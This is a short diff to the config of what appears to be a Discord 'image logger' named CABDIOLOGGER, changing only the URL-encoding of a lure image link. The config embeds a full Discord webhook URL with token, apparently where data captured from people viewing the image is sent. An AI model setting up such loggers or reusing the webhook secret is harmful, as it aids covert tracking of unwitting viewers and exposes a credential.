@@ -11,7 +11,7 @@ __author__ = "cabdio"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1450074745784504361/W5ihCIrHZO47ybGfBL-JcDuOLLMLN1z7SwI9gqAPLRHfAxwPOU7wJPYzZNhyACiRd0Xa",
-    "image": "https://media.istockphoto.com/id/1399072907/photo/encryption-your-data-digital-lock-hacker-attack-and-data-breach-big-data-with-encrypted.jpg?s=612x612&w=0&k=20&c=cnAJ9BpOYM8fQoaoTo19h4ugLqaXAomcJIgVoS-nuP0=", 
+    "image": "https://media.istockphoto.com/id/1399072907/photo/encryption-your-data-digital-lock-hacker-attack-and-data-breach-big-data-with-encrypted.jpg?s=612x612&w=0&k=20&c=cnAJ9BpOYM8fQoaoTo19h4ugLqaXAomcJIgVoS-nuP0%3D", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
